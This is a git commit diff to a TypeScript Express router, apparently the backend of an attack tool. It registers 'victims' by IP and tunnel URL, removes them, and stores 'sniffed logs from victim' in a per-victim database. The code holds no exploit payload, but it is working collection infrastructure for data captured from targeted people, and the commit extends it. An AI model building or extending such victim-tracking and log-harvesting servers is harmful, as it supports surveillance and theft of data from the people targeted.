1988567051b3c2a3579553d420f724a04c55265a
bietdoikiem <minhlucky2408@gmail.com>
2022-01-01 02:15:52 +0700

    feat: add manage logs for Victim list

--- backend/src/routers/victims.ts
+++ backend/src/routers/victims.ts
@@ -13,18 +13,27 @@ const router = Router();
  */
 router.post('/', (req: Request, res: Response) => {
   const { url, ip, createdAt, type } = req.body;
+  // Check if DB has not been init &&
+  let index: number = -1;
+  try {
+    index = db.getIndex('/victims', ip, 'ip');
+  } catch (err) {
+    if (!err.message.startsWith("Can't find dataPath")) {
+      console.error(err);
+      return res.status(400).send();
+    }
+  }
   // Upsert URL if victim has already existed
-  const existingVictimIdx = db.getIndex('/victims', ip, 'ip');
-  if (existingVictimIdx !== -1) {
+  if (index !== -1) {
     db.push(
-      `/victims[${existingVictimIdx}]`,
+      `/victims[${index}]`,
       {
         url,
       },
       false
     );
     console.info(
-      `[${new Date().toLocaleString()}] [Victim] ${url} has been updated for the existing victim in DB`
+      `[${new Date().toLocaleString()}] [Victim] - ${url} has been updated for the existing victim in DB`
     );
     return res.status(200).send();
   }
@@ -40,7 +49,7 @@ router.post('/', (req: Request, res: Response) => {
     true
   );
   console.info(
-    `[${new Date().toLocaleString()}] [Victim] ${url} has been saved to DB`
+    `[${new Date().toLocaleString()}] [Victim] - ${url} has been saved to DB`
   );
   return res.status(200).send();
 });
@@ -51,20 +60,50 @@ router.post('/', (req: Request, res: Response) => {
 router.delete('/tunnels', (req: Request, res: Response) => {
   const { tunnelURL } = req.query;
   // Find and Delete by Tunnel's URL
-  db.delete(`/victims[${db.getIndex('/victims', tunnelURL as string, 'url')}]`);
+  try {
+    db.delete(
+      `/victims[${db.getIndex('/victims', tunnelURL as string, 'url')}]`
+    );
+  } catch (err) {
+    console.error(err);
+    return res.status(400).send();
+  }
   console.info(
-    `[${new Date().toLocaleString()}] [Victim] Victim at ${tunnelURL} is removed from the DB`
+    `[${new Date().toLocaleString()}] [Victim] - Victim at ${tunnelURL} is removed from the DB`
   );
-  return res.status(404).send();
+  return res.status(200).send();
 });
 
 /**
  * Add the sniffed logs from victim
  */
 router.post('/logs', (req: Request, res: Response) => {
-  const { ip, log } = req.body;
-  for (let i = 0; i < db.count('/victims'); i++) {
-    console.log('Print');
+  const { victimIP } = req.query;
+  const { log } = req.body;
+  // Parse log
+  const parsedLog = JSON.parse(log);
+  // Output log
+  console.info(
+    `[${new Date().toLocaleString()}] [Victim] [${victimIP}] - ${log}`
+  );
+  // Save to log by IP
+  let index: number = -1;
+  try {
+    index = db.getIndex('/victims', victimIP as string, 'ip');
+  } catch (err) {
+    if (!err.message.startsWith("Can't find dataPath")) {
+      console.error(err);
+      return res.status(400).send();
+    }
+  }
+  if (index !== -1) {
+    db.push(
+      `/victims[${index}]/logs[]`,
+      {
+        ...parsedLog,
+      },
+      true
+    );
   }
   return res.status(200).send();
 });
@@ -74,7 +113,7 @@ router.post('/logs', (req: Request, res: Response) => {
  */
 router.post('/msg', (req: Request, res: Response) => {
   const { msg } = req.body;
-  console.info(`[${new Date().toLocaleString()}] [Victim] ${msg}`);
+  console.info(`[${new Date().toLocaleString()}] [Victim] - ${msg}`);
   return res.status(200).send();
 });
 
